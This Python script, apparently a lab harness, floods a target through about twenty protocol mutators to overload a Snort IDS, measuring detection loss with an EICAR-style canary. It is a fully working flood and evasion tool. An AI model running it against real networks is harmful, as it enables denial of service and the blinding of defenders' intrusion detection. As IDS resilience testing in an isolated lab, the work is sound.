#!/usr/bin/env python3
"""
Snort Blinder - Multi-Protocol Inspector Overload Test
=======================================================
Split architecture:
  - HOST mode (default): orchestrates Snort setup, launches flood inside
    kali_attacker via docker exec, monitors Snort alerts, displays dashboard.
  - FLOOD mode (--flood): runs INSIDE kali_attacker container. Fires all
    protocol mutators simultaneously against the target. Writes stats to
    a shared JSON file so the host orchestrator can read them.

Usage (from host):
    python3 Testing/snort_blinder.py
    python3 Testing/snort_blinder.py --duration 120 --phase-duration 30

The script auto-detects whether it's inside kali (flood mode) or on the
host (orchestrator mode) based on --flood flag.
"""

import argparse
import json
import os
import random
import socket
import struct
import subprocess
import sys
import threading
import time
from collections import defaultdict

# -- Path setup ---------------------------------------------------------------
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

# -- Constants ----------------------------------------------------------------
TARGET_IP = "172.21.0.2"
MAX_PAYLOAD_SIZE = 4096
PAYLOAD_POOL_SIZE = 50
POOL_REFRESH_INTERVAL = 500

TCP_CONNECT_TIMEOUT = 2.0
TCP_SEND_TIMEOUT = 1.0
TCP_PAYLOADS_PER_CONN = 100
UDP_SEND_TIMEOUT = 0.05

CANARY_PAYLOAD = b"GET /EICAR-STANDARD-ANTIVIRUS-TEST-FILE! HTTP/1.1\r\nHost: target\r\n\r\n"
CANARY_SID = "1000001"

ATTACKER = "kali_attacker"
FIREWALL = "snort_firewall"
SNORT_LOG = "/var/log/snort/alert_fast.txt"
STATS_FILE = "/tmp/blinder_stats.json"

# ═══════════════════════════════════════════════════════════════════════════════
# FLOOD ENGINE  (runs inside kali_attacker)
# ═══════════════════════════════════════════════════════════════════════════════

# Protocol registry: name -> (transport, port, mutator_class_name)
PROTOCOL_REGISTRY = {
    "dns":     ("udp",  53,   None),
    "dhcp":    ("udp",  67,   "DhcpMutator"),
    "snmp":    ("udp",  161,  "SnmpMutator"),
    "sip":     ("udp",  5060, "SipMutator"),
    "mgcp":    ("udp",  2427, "MgcpMutator"),
    "radius":  ("udp",  1812, "RadiusMutator"),
    "sunrpc":  ("udp",  111,  "SunrpcMutator"),
    "tftp":    ("udp",  69,   "TftpMutator"),
    "http":    ("tcp",  80,   "HttpMutator"),
    "ftp":     ("tcp",  21,   "FtpMutator"),
    "smtp":    ("tcp",  25,   "SmtpMutator"),
    "ssh":     ("tcp",  22,   "SshMutator"),
    "smb2":    ("tcp",  445,  "Smb2Mutator"),
    "http2":   ("tcp",  80,   "Http2Mutator"),
    "dcerpc":  ("tcp",  135,  "DcerpcMutator"),
    "rtsp":    ("tcp",  554,  "RtspMutator"),
    "tacacs":  ("tcp",  49,   "TacacsMutator"),
    "ldap":    ("tcp",  389,  "LdapMutator"),
    "cifs":    ("tcp",  445,  "CifsMutator"),
    "telnet":  ("tcp",  23,   "TelnetMutator"),
    "icmp":    ("icmp", 0,    "IcmpMutator"),
}


def _import_mutators():
    """Lazy-import mutators (only needed inside flood engine)."""
    from protocol.dns import DNSMessage, DNSHeader, DNSQuestion
    from protocol.ftp import FtpMutator
    from protocol.http import HttpMutator
    from protocol.smtp import SmtpMutator
    from protocol.ssh import SshMutator
    from protocol.smb import Smb2Mutator
    from protocol.http2 import Http2Mutator
    from protocol.dcerpc import DcerpcMutator
    from protocol.dhcp import DhcpMutator
    from protocol.snmp import SnmpMutator
    from protocol.icmp import IcmpMutator
    from protocol.sip import SipMutator
    from protocol.mgcp import MgcpMutator
    from protocol.rtsp import RtspMutator
    from protocol.radius import RadiusMutator
    from protocol.tacacs import TacacsMutator
    from protocol.ldap import LdapMutator
    from protocol.cifs import CifsMutator
    from protocol.sunrpc import SunrpcMutator
    from protocol.telnet import TelnetMutator
    from protocol.tftp import TftpMutator
    return {
        "DhcpMutator": DhcpMutator, "SnmpMutator": SnmpMutator,
        "SipMutator": SipMutator, "MgcpMutator": MgcpMutator,
        "RadiusMutator": RadiusMutator, "SunrpcMutator": SunrpcMutator,
        "TftpMutator": TftpMutator, "HttpMutator": HttpMutator,
        "FtpMutator": FtpMutator, "SmtpMutator": SmtpMutator,
        "SshMutator": SshMutator, "Smb2Mutator": Smb2Mutator,
        "Http2Mutator": Http2Mutator, "DcerpcMutator": DcerpcMutator,
        "RtspMutator": RtspMutator, "TacacsMutator": TacacsMutator,
        "LdapMutator": LdapMutator, "CifsMutator": CifsMutator,
        "TelnetMutator": TelnetMutator, "IcmpMutator": IcmpMutator,
        "DNSMessage": DNSMessage, "DNSHeader": DNSHeader,
        "DNSQuestion": DNSQuestion,
    }


class Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.packets = defaultdict(int)
        self.bytes_sent = defaultdict(int)
        self.errors = defaultdict(int)
        self.canary_sent = 0
        self.canary_ok = 0
        self.start_time = None

    def record_batch(self, proto, count, nbytes, errors=0):
        with self._lock:
            self.packets[proto] += count
            self.bytes_sent[proto] += nbytes
            if errors:
                self.errors[proto] += errors

    def record(self, proto, nbytes, error=False):
        with self._lock:
            if error:
                self.errors[proto] += 1
            else:
                self.packets[proto] += 1
                self.bytes_sent[proto] += nbytes

    def record_canary(self):
        with self._lock:
            self.canary_sent += 1

    def snapshot(self):
        with self._lock:
            elapsed = (time.time() - self.start_time) if self.start_time else 1
            total_pkts = sum(self.packets.values())
            total_byt = sum(self.bytes_sent.values())
            return {
                "elapsed": round(elapsed, 1),
                "total_packets": total_pkts,
                "total_bytes": total_byt,
                "pps": round(total_pkts / max(elapsed, 1)),
                "mbps": round((total_byt * 8) / (max(elapsed, 1) * 1_000_000), 2),
                "per_proto": dict(self.packets),
                "errors": dict(self.errors),
                "canary_sent": self.canary_sent,
            }


stats = Stats()
stop_event = threading.Event()
current_phase = {"num": 0, "send_delay": 0.0}


# -- Payload Generation -------------------------------------------------------
def gen_dns_payload(dns_classes):
    domains = [
        "evil.test.local", "fuzz.example.com", "x" * 60 + ".test.local",
        "admin.internal.corp", "a." * 30 + "test.com",
    ]
    hdr = dns_classes["DNSHeader"](transaction_id=random.randint(0, 65535), qdcount=1)
    q = dns_classes["DNSQuestion"](random.choice(domains),
                                   random.choice([1, 2, 5, 6, 15, 16, 28, 33, 255]))
    return dns_classes["DNSMessage"](header=hdr, questions=[q]).to_bytes()


def gen_mutated_payload(mutator):
    result = mutator.mutate()
    if isinstance(result, tuple):
        payload = result[0]
    elif isinstance(result, dict):
        payload = result.get("payload", result.get("data", b""))
    elif isinstance(result, bytes):
        payload = result
    else:
        payload = bytes(result) if result else b"\x00" * 64
    if not isinstance(payload, bytes):
        payload = bytes(payload) if payload else b"\x00" * 32
    return payload[:MAX_PAYLOAD_SIZE]


def build_payload_pool(proto, mutator, dns_classes=None):
    pool = []
    for _ in range(PAYLOAD_POOL_SIZE):
        try:
            if proto == "dns" and dns_classes:
                pool.append(gen_dns_payload(dns_classes)[:MAX_PAYLOAD_SIZE])
            elif mutator:
                pool.append(gen_mutated_payload(mutator))
            else:
                pool.append(b"\x00" * 64)
        except Exception:
            pool.append(b"\x00" * 64)
    return pool


BATCH_SIZE = 50  # Flush stats every N packets

# -- UDP Worker ---------------------------------------------------------------
def udp_worker(proto, target, port, mutator, dns_classes):
    pool = build_payload_pool(proto, mutator, dns_classes)
    idx = random.randint(0, len(pool) - 1)
    refresh = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(UDP_SEND_TIMEOUT)
    local_pkts = 0
    local_bytes = 0
    local_errs = 0

    while not stop_event.is_set():
        try:
            payload = pool[idx % len(pool)]
            idx += 1
            sock.sendto(payload, (target, port))
            local_pkts += 1
            local_bytes += len(payload)
            delay = current_phase.get("send_delay", 0)
            if delay > 0:
                time.sleep(delay)
            refresh += 1
            if local_pkts >= BATCH_SIZE:
                stats.record_batch(proto, local_pkts, local_bytes, local_errs)
                local_pkts = local_bytes = local_errs = 0
            if refresh >= POOL_REFRESH_INTERVAL:
                refresh = 0
                pool = build_payload_pool(proto, mutator, dns_classes)
                idx = 0
        except Exception:
            local_errs += 1
            if local_pkts >= BATCH_SIZE or local_errs >= BATCH_SIZE:
                stats.record_batch(proto, local_pkts, local_bytes, local_errs)
                local_pkts = local_bytes = local_errs = 0
    if local_pkts or local_errs:
        stats.record_batch(proto, local_pkts, local_bytes, local_errs)
    sock.close()


# -- TCP Persistent Worker ----------------------------------------------------
def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
    pool = build_payload_pool(proto, mutator, dns_classes)
    idx = random.randint(0, len(pool) - 1)
    refresh = 0
    local_pkts = 0
    local_bytes = 0
    local_errs = 0

    def _flush():
        nonlocal local_pkts, local_bytes, local_errs
        if local_pkts or local_errs:
            stats.record_batch(proto, local_pkts, local_bytes, local_errs)
            local_pkts = local_bytes = local_errs = 0

    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(TCP_CONNECT_TIMEOUT)
            sock.connect((target, port))
            sock.settimeout(TCP_SEND_TIMEOUT)

            for _ in range(TCP_PAYLOADS_PER_CONN):
                if stop_event.is_set():
                    break
                try:
                    payload = pool[idx % len(pool)]
                    idx += 1
                    sock.sendall(payload)
                    local_pkts += 1
                    local_bytes += len(payload)
                    delay = current_phase.get("send_delay", 0)
                    if delay > 0:
                        time.sleep(delay)
                    refresh += 1
                    if local_pkts >= BATCH_SIZE:
                        _flush()
                    if refresh >= POOL_REFRESH_INTERVAL:
                        refresh = 0
                        pool = build_payload_pool(proto, mutator, dns_classes)
                        idx = 0
                except (BrokenPipeError, ConnectionResetError, OSError):
                    local_errs += 1
                    break
            try:
                sock.shutdown(socket.SHUT_WR)
            except Exception:
                pass
            sock.close()
        except (ConnectionRefusedError, OSError):
            local_errs += 1
            if sock:
                try: sock.close()
                except Exception: pass
            time.sleep(0.05)
        except Exception:
            local_errs += 1
            if sock:
                try: sock.close()
                except Exception: pass
            time.sleep(0.01)
        if local_pkts >= BATCH_SIZE or local_errs >= BATCH_SIZE:
            _flush()
    _flush()


# -- ICMP Worker --------------------------------------------------------------
def icmp_worker(target):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(0.1)
    except PermissionError:
        print("  [!] ICMP requires root - skipping", flush=True)
        return

    def _make_pool():
        pool = []
        for _ in range(PAYLOAD_POOL_SIZE):
            ident = random.randint(0, 65535)
            seq = random.randint(0, 65535)
            data = os.urandom(random.randint(56, 512))
            hdr = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
            blob = hdr + data
            if len(blob) % 2:
                blob += b"\x00"
            s = sum(struct.unpack("!%dH" % (len(blob) // 2), blob))
            while s >> 16:
                s = (s & 0xFFFF) + (s >> 16)
            cksum = ~s & 0xFFFF
            pool.append(struct.pack("!BBHHH", 8, 0, cksum, ident, seq) + data)
        return pool

    icmp_pool = _make_pool()
    idx = 0
    refresh = 0

    while not stop_event.is_set():
        try:
            payload = icmp_pool[idx % len(icmp_pool)]
            idx += 1
            sock.sendto(payload, (target, 0))
            stats.record("icmp", len(payload))
            delay = current_phase.get("send_delay", 0)
            if delay > 0:
                time.sleep(delay)
            refresh += 1
            if refresh >= POOL_REFRESH_INTERVAL:
                refresh = 0
                icmp_pool = _make_pool()
                idx = 0
        except Exception:
            stats.record("icmp", 0, error=True)
    sock.close()


# -- Canary sender (TCP from inside kali) -------------------------------------
def canary_sender(target, interval=5.0):
    time.sleep(8)
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, 80))
            s.sendall(CANARY_PAYLOAD)
            try: s.recv(4096)
            except Exception: pass
            s.close()
            stats.record_canary()
        except Exception:
            pass
        for _ in range(int(interval * 10)):
            if stop_event.is_set():
                return
            time.sleep(0.1)


# -- Stats writer (writes JSON to shared volume) ------------------------------
def _stats_writer_loop(path):
    while not stop_event.is_set():
        try:
            snap = stats.snapshot()
            with open(path, "w") as f:
                json.dump(snap, f)
        except Exception:
            pass
        time.sleep(1)


# -- Intensity presets --------------------------------------------------------
# Each level: (udp_threads_per_proto, tcp_conns_per_proto, phases)
INTENSITY_PRESETS = {
    1: {"udp": 3,  "tcp": 2,  "label": "Normal",
        "phases": [
            {"name": "Warm-up", "send_delay": 0.001},
            {"name": "Ramp",    "send_delay": 0.0005},
            {"name": "High",    "send_delay": 0.0001},
            {"name": "Max",     "send_delay": 0},
        ]},
    2: {"udp": 6,  "tcp": 4,  "label": "Elevated",
        "phases": [
            {"name": "Warm-up", "send_delay": 0.0005},
            {"name": "Ramp",    "send_delay": 0.0001},
            {"name": "High",    "send_delay": 0.00005},
            {"name": "Max",     "send_delay": 0},
        ]},
    3: {"udp": 10, "tcp": 6,  "label": "High",
        "phases": [
            {"name": "Warm-up", "send_delay": 0.0001},
            {"name": "Ramp",    "send_delay": 0.00005},
            {"name": "Max",     "send_delay": 0},
        ]},
    4: {"udp": 15, "tcp": 8,  "label": "Extreme",
        "phases": [
            {"name": "Warm-up", "send_delay": 0.00005},
            {"name": "Max",     "send_delay": 0},
        ]},
    5: {"udp": 20, "tcp": 12, "label": "Maximum",
        "phases": [
            {"name": "Max",     "send_delay": 0},
        ]},
}


# -- Flood engine main --------------------------------------------------------
def run_flood(target, duration, phase_duration, intensity=1,
              proto_filter=None, stats_file_override=None):
    preset = INTENSITY_PRESETS.get(intensity, INTENSITY_PRESETS[1])

    # Filter protocols if subset specified
    if proto_filter:
        active_reg = {k: v for k, v in PROTOCOL_REGISTRY.items() if k in proto_filter}
        tag = f"[worker {','.join(sorted(proto_filter))}]"
    else:
        active_reg = dict(PROTOCOL_REGISTRY)
        tag = "[all protocols]"

    sf = stats_file_override or STATS_FILE

    print("=" * 70, flush=True)
    print(f"  FLOOD ENGINE — Intensity {intensity} [{preset['label']}] {tag}",
          flush=True)
    print("=" * 70, flush=True)

    phases = preset["phases"]
    total_phases = len(phases)
    if duration < total_phases * phase_duration:
        phase_duration = max(duration // total_phases, 5)

    current_phase["num"] = 0
    current_phase["send_delay"] = phases[0]["send_delay"]

    print(f"  Target: {target}, Duration: {duration}s, Phases: {total_phases}x{phase_duration}s",
          flush=True)
    print(f"  UDP threads/proto: {preset['udp']}, TCP conns/proto: {preset['tcp']}",
          flush=True)
    print(f"  Protocols: {', '.join(sorted(active_reg.keys()))}", flush=True)
    print(f"  Stats file: {sf}", flush=True)

    # Import mutators
    print("  [*] Importing mutators...", flush=True)
    classes = _import_mutators()

    # Build mutator instances
    mutators = {}
    for name, (transport, port, mcls_name) in active_reg.items():
        if mcls_name and mcls_name in classes:
            try:
                mutators[name] = classes[mcls_name]()
            except Exception as e:
                print(f"      [!] {name}: {e}", flush=True)
                mutators[name] = None
        else:
            mutators[name] = None

    dns_classes = {k: classes[k] for k in ("DNSMessage", "DNSHeader", "DNSQuestion")}

    # Separate protocols by transport
    udp_protos = [(n, p) for n, (t, p, _) in active_reg.items() if t == "udp"]
    tcp_protos = [(n, p) for n, (t, p, _) in active_reg.items() if t == "tcp"]

    UDP_THREADS = preset["udp"]
    TCP_CONNS = preset["tcp"]

    workers = []
    stats.start_time = time.time()

    for name, port in udp_protos:
        for i in range(UDP_THREADS):
            w = threading.Thread(target=udp_worker,
                                 args=(name, target, port, mutators.get(name), dns_classes),
                                 daemon=True, name=f"udp-{name}-{i}")
            workers.append(w)

    for name, port in tcp_protos:
        for i in range(TCP_CONNS):
            w = threading.Thread(target=tcp_persistent_worker,
                                 args=(name, target, port, mutators.get(name), dns_classes),
                                 daemon=True, name=f"tcp-{name}-{i}")
            workers.append(w)

    if "icmp" in active_reg:
        icmp_thread = threading.Thread(target=icmp_worker, args=(target,), daemon=True, name="icmp")
        workers.append(icmp_thread)

    canary_thread = threading.Thread(target=canary_sender, args=(target,), daemon=True, name="canary")
    writer_thread = threading.Thread(target=lambda: _stats_writer_loop(sf), daemon=True, name="stats-writer")

    total_w = len(workers)
    print(f"  [*] Launching {total_w} workers "
          f"(UDP:{UDP_THREADS}x{len(udp_protos)}, TCP:{TCP_CONNS}x{len(tcp_protos)}, ICMP:1)",
          flush=True)

    writer_thread.start()
    canary_thread.start()
    for w in workers:
        w.start()

    print(f"  [*] All protocols firing! Running {duration}s...", flush=True)

    # Phase management
    phase_start = time.time()
    deadline = time.time() + duration
    while time.time() < deadline and not stop_event.is_set():
        elapsed_phase = time.time() - phase_start
        if elapsed_phase >= phase_duration:
            idx = min(current_phase["num"] + 1, total_phases - 1)
            if idx != current_phase["num"]:
                current_phase["num"] = idx
                current_phase["send_delay"] = phases[idx]["send_delay"]
                print(f"\n  >> Phase {idx+1}/{total_phases}: {phases[idx]['name']} "
                      f"(delay={phases[idx]['send_delay']})", flush=True)
                phase_start = time.time()

        # Print inline stats
        snap = stats.snapshot()
        active = len([p for p, c in snap["per_proto"].items() if c > 0])
        sys.stdout.write(
            f"\r  {snap['elapsed']:>6.0f}s | {snap['pps']:>6,} pps | "
            f"{snap['mbps']:>6.1f} Mbps | {active} protos | "
            f"canary:{snap['canary_sent']}     ")
        sys.stdout.flush()
        time.sleep(1)

    stop_event.set()
    print("\n\n  [*] Stopping...", flush=True)
    for w in workers:
        w.join(timeout=3)

    # Final stats dump
    snap = stats.snapshot()
    try:
        with open(sf, "w") as f:
            json.dump(snap, f)
    except Exception:
        pass

    print(f"\n  Final: {snap['total_packets']:,} pkts, {snap['total_bytes']/(1024*1024):.1f} MB, "
          f"{snap['pps']:,} pps, {snap['mbps']} Mbps", flush=True)
    for name in sorted(active_reg.keys()):
        pkts = snap["per_proto"].get(name, 0)
        errs = snap["errors"].get(name, 0)
        if pkts > 0 or errs > 0:
            print(f"    {name:<12} {pkts:>10,} pkts  {errs:>6,} errs", flush=True)


# ═══════════════════════════════════════════════════════════════════════════════
# HOST ORCHESTRATOR  (runs on host Mac)
# ═══════════════════════════════════════════════════════════════════════════════

def dexec(container, cmd, timeout=15):
    try:
        return subprocess.run(
            ["docker", "exec", container, "bash", "-c", cmd],
            capture_output=True, text=True, timeout=timeout
        )
    except Exception:
        return None


def get_alert_count(pattern="\\[\\*\\*\\]"):
    r = dexec(FIREWALL, f"grep -c '{pattern}' {SNORT_LOG} 2>/dev/null || echo 0")
    if r and r.stdout.strip().isdigit():
        return int(r.stdout.strip())
    return 0


def run_orchestrator(duration, phase_duration, intensity=1, n_processes_override=None):
    print("=" * 78)
    print("  SNORT BLINDER - Host Orchestrator")
    print("=" * 78)

    # 1. Verify containers
    for c in (ATTACKER, FIREWALL, "target_server"):
        r = subprocess.run(["docker", "inspect", "-f", "{{.State.Running}}", c],
                          capture_output=True, timeout=10)
        if r.returncode != 0 or b"true" not in r.stdout:
            print(f"  [!] Container {c} not running. Run: docker compose up -d")
            return

    # 2. Ensure Snort is running
    r = dexec(FIREWALL, "pidof snort")
    if not r or not r.stdout.strip():
        print("  [*] Starting Snort...")
        dexec(FIREWALL,
              "snort -c /usr/local/etc/snort/snort.lua -i eth0 -l /var/log/snort "
              "-A fast -D -k none", timeout=20)
        time.sleep(3)
        r = dexec(FIREWALL, "pidof snort")
        if not r or not r.stdout.strip():
            print("  [!] Failed to start Snort!")
            return
    print(f"  [+] Snort PID: {r.stdout.strip()}")

    # 3. Ensure HTTP listener on target
    dexec("target_server", "python3 -m http.server 80 --bind 0.0.0.0 &>/dev/null &")
    time.sleep(1)

    # 4. Clear logs
    dexec(FIREWALL, f"truncate -s0 {SNORT_LOG}")

    # 5. Quick canary test BEFORE flood
    print("  [*] Testing canary detection...")
    pre = get_alert_count(CANARY_SID)
    dexec(ATTACKER,
          f"python3 -c \""
          f"import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
          f"s.settimeout(3);s.connect(('{TARGET_IP}',80));"
          f"s.sendall(b'GET /EICAR-STANDARD-ANTIVIRUS-TEST-FILE! HTTP/1.1\\r\\nHost: t\\r\\n\\r\\n');"
          f"s.recv(4096);s.close()\"")
    time.sleep(2)
    post = get_alert_count(CANARY_SID)
    if post > pre:
        print(f"  [+] Canary DETECTED by Snort (SID {CANARY_SID}). System verified!")
    else:
        print(f"  [!] Canary NOT detected. Snort may not be inspecting traffic.")
        print(f"      Alerts before={pre}, after={post}. Continuing anyway...")

    # 6. Clear logs again for clean test
    dexec(FIREWALL, f"truncate -s0 {SNORT_LOG}")
    pre_alerts = 0

    # 7. Launch flood inside kali — MULTI-PROCESS
    preset = INTENSITY_PRESETS.get(intensity, INTENSITY_PRESETS[1])
    all_protos = list(PROTOCOL_REGISTRY.keys())

    # Determine number of parallel processes
    if n_processes_override:
        n_procs = n_processes_override
    elif intensity >= 5:
        n_procs = 6
    elif intensity >= 4:
        n_procs = 4
    elif intensity >= 3:
        n_procs = 3
    else:
        n_procs = 1

    # Split protocols into groups
    # If more processes than protocols, duplicate protocols across processes
    if n_procs <= len(all_protos):
        proto_groups = [[] for _ in range(n_procs)]
        for i, p in enumerate(all_protos):
            proto_groups[i % n_procs].append(p)
    else:
        # First N groups get unique protocol sets, extras get full protocol copies
        proto_groups = [[] for _ in range(min(n_procs, len(all_protos)))]
        for i, p in enumerate(all_protos):
            proto_groups[i % len(proto_groups)].append(p)
        # Duplicate groups to fill remaining processes
        base_groups = list(proto_groups)
        while len(proto_groups) < n_procs:
            proto_groups.append(list(base_groups[len(proto_groups) % len(base_groups)]))

    total_threads = 0
    for g in proto_groups:
        udp_c = len([p for p in g if PROTOCOL_REGISTRY[p][0] == "udp"])
        tcp_c = len([p for p in g if PROTOCOL_REGISTRY[p][0] == "tcp"])
        icmp_c = len([p for p in g if PROTOCOL_REGISTRY[p][0] == "icmp"])
        total_threads += udp_c * preset["udp"] + tcp_c * preset["tcp"] + icmp_c

    print(f"\n  [*] Launching {n_procs} parallel flood processes inside {ATTACKER}")
    print(f"  [*] Intensity: {intensity} [{preset['label']}] — "
          f"UDP:{preset['udp']}/proto, TCP:{preset['tcp']}/proto")
    print(f"  [*] Total workers: ~{total_threads} across {n_procs} processes")
    print(f"  [*] Duration: {duration}s")
    for gi, g in enumerate(proto_groups):
        print(f"      Process {gi}: {', '.join(g)}")

    flood_procs = []
    stats_files = []
    for gi, group in enumerate(proto_groups):
        sf = f"/tmp/blinder_stats_{gi}.json"
        stats_files.append(sf)
        proto_list = ",".join(group)
        flood_cmd = (
            f"cd /fuzzer && python3 Testing/snort_blinder.py "
            f"--flood --target {TARGET_IP} --duration {duration} "
            f"--phase-duration {phase_duration} --intensity {intensity} "
            f"--protocols {proto_list} --stats-file {sf}"
        )
        proc = subprocess.Popen(
            ["docker", "exec", ATTACKER, "bash", "-c", flood_cmd],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        flood_procs.append(proc)

    # 8. Monitor loop - read flood output + check Snort
    canary_counts = []
    start_time = time.time()

    print(f"\n  {'─'*74}")
    print(f"  {'Time':>6} {'PPS':>8} {'Mbps':>8} {'Protos':>7} "
          f"{'Alerts':>8} {'Canary':>12} {'Status':>10}")
    print(f"  {'─'*74}")

    def _any_running():
        return any(p.poll() is None for p in flood_procs)

    def _aggregate_stats():
        """Read and aggregate stats from all process stats files."""
        agg = {"elapsed": 0, "pps": 0, "mbps": 0, "per_proto": {},
               "canary_sent": 0, "total_packets": 0, "total_bytes": 0,
               "errors": {}}
        cat_cmd = " ".join(f"cat {sf} 2>/dev/null;echo '|||';" for sf in stats_files)
        r = dexec(ATTACKER, cat_cmd, timeout=5)
        if not r or not r.stdout:
            return agg
        parts = r.stdout.split("|||")
        for part in parts:
            part = part.strip()
            if not part:
                continue
            try:
                s = json.loads(part)
                agg["total_packets"] += s.get("total_packets", 0)
                agg["total_bytes"] += s.get("total_bytes", 0)
                agg["canary_sent"] += s.get("canary_sent", 0)
                agg["elapsed"] = max(agg["elapsed"], s.get("elapsed", 0))
                for p, c in s.get("per_proto", {}).items():
                    agg["per_proto"][p] = agg["per_proto"].get(p, 0) + c
                for p, c in s.get("errors", {}).items():
                    agg["errors"][p] = agg["errors"].get(p, 0) + c
            except Exception:
                continue
        el = max(agg["elapsed"], 1)
        agg["pps"] = round(agg["total_packets"] / el)
        agg["mbps"] = round((agg["total_bytes"] * 8) / (el * 1_000_000), 2)
        return agg

    try:
        while _any_running():
            # Check Snort alerts
            total_alerts = get_alert_count()
            canary_alerts = get_alert_count(CANARY_SID)

            # Aggregate stats from all process files
            snap = _aggregate_stats()

            active = len([p for p, c in snap.get("per_proto", {}).items() if c > 0])
            canary_sent = snap.get("canary_sent", 0)

            if canary_sent > 0:
                det_rate = round(canary_alerts / canary_sent * 100, 1)
                canary_str = f"{canary_alerts}/{canary_sent} ({det_rate}%)"
            else:
                det_rate = 100.0
                canary_str = "waiting..."

            if canary_sent < 2:
                status = "WARMING"
            elif det_rate >= 80:
                status = "DETECTING"
            elif det_rate >= 30:
                status = "DEGRADED"
            else:
                status = "BLINDED!"

            elapsed = round(time.time() - start_time)
            print(f"  {elapsed:>5}s {snap.get('pps',0):>8,} {snap.get('mbps',0):>8.1f} "
                  f"{active:>7} {total_alerts:>8,} {canary_str:>12} {status:>10}")

            time.sleep(3)

    except KeyboardInterrupt:
        print("\n  [!] Interrupted")
        for p in flood_procs:
            p.terminate()

    # Wait for all flood processes to finish
    for p in flood_procs:
        try:
            p.wait(timeout=10)
        except Exception:
            p.kill()

    # 10. Final report
    post_alerts = get_alert_count()
    canary_alerts = get_alert_count(CANARY_SID)
    final_snap = _aggregate_stats()

    total_pkts = final_snap.get("total_packets", 0)
    total_bytes = final_snap.get("total_bytes", 0)
    canary_sent = final_snap.get("canary_sent", 0)
    pps = final_snap.get("pps", 0)
    mbps = final_snap.get("mbps", 0)

    print(f"\n{'='*78}")
    print(f"  SNORT BLINDER — RESULTS")
    print(f"{'='*78}")
    print(f"  Duration:         {duration}s")
    print(f"  Total packets:    {total_pkts:,}")
    print(f"  Total bytes:      {total_bytes:,} ({total_bytes/(1024*1024):.1f} MB)")
    print(f"  Throughput:       {pps:,} pps / {mbps} Mbps")
    print(f"  Snort alerts:     {post_alerts:,}")
    print(f"  Active protos:    {len([p for p,c in final_snap.get('per_proto',{}).items() if c>0])}")

    print(f"\n  Canary Detection:")
    print(f"    Canaries sent:     {canary_sent}")
    print(f"    Canaries detected: {canary_alerts}")
    if canary_sent > 0:
        det = round(canary_alerts / canary_sent * 100, 1)
        print(f"    Detection rate:    {det}%")
    else:
        det = 100.0
        print(f"    Detection rate:    N/A (no canaries sent)")

    print(f"\n  Per-Protocol Breakdown:")
    print(f"  {'Protocol':<12} {'Packets':>10} {'Errors':>8} {'PPS':>8}")
    print(f"  {'-'*42}")
    per_proto = final_snap.get("per_proto", {})
    errors = final_snap.get("errors", {})
    elapsed = max(final_snap.get("elapsed", 1), 1)
    for name in sorted(PROTOCOL_REGISTRY.keys()):
        pkts = per_proto.get(name, 0)
        errs = errors.get(name, 0)
        proto_pps = round(pkts / elapsed)
        if pkts > 0 or errs > 0:
            print(f"  {name:<12} {pkts:>10,} {errs:>8,} {proto_pps:>8,}")
    print(f"  {'-'*42}")
    total_errs = sum(errors.values())
    print(f"  {'TOTAL':<12} {total_pkts:>10,} {total_errs:>8,} {pps:>8,}")

    print(f"\n  {'='*42}")
    if canary_sent == 0:
        print(f"  VERDICT: No canaries sent — test too short or canary failed")
    elif det >= 80:
        print(f"  VERDICT: Snort WITHSTOOD the attack (detection: {det}%)")
    elif det >= 30:
        print(f"  VERDICT: Snort DEGRADED — partial blindness (detection: {det}%)")
    else:
        print(f"  VERDICT: Snort BLINDED — failed to detect canary (detection: {det}%)")
    print(f"  {'='*42}\n")

    # Dump alert breakdown
    r = dexec(FIREWALL, f"head -50 {SNORT_LOG}")
    if r and r.stdout.strip():
        print("  First 50 Snort alerts:")
        for line in r.stdout.strip().split("\n")[:20]:
            print(f"    {line.strip()}")


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(description="Snort Blinder")
    parser.add_argument("--flood", action="store_true",
                        help="Run in flood mode (inside kali_attacker)")
    parser.add_argument("--target", default=TARGET_IP, help="Target IP")
    parser.add_argument("--duration", type=int, default=60,
                        help="Total duration (seconds)")
    parser.add_argument("--phase-duration", type=int, default=15,
                        help="Duration per phase (seconds)")
    parser.add_argument("--intensity", type=int, default=1, choices=[1,2,3,4,5],
                        help="Flood intensity 1-5 (1=normal, 5=maximum)")
    parser.add_argument("--protocols", type=str, default=None,
                        help="Comma-separated protocol subset (flood mode only)")
    parser.add_argument("--stats-file", type=str, default=None,
                        help="Stats JSON path override (flood mode only)")
    parser.add_argument("--processes", type=int, default=None,
                        help="Number of parallel flood processes (overrides auto)")
    args = parser.parse_args()

    if args.flood:
        pf = set(args.protocols.split(",")) if args.protocols else None
        run_flood(args.target, args.duration, args.phase_duration,
                  args.intensity, proto_filter=pf, stats_file_override=args.stats_file)
    else:
        run_orchestrator(args.duration, args.phase_duration, args.intensity,
                         n_processes_override=args.processes)


if __name__ == "__main__":
    main()
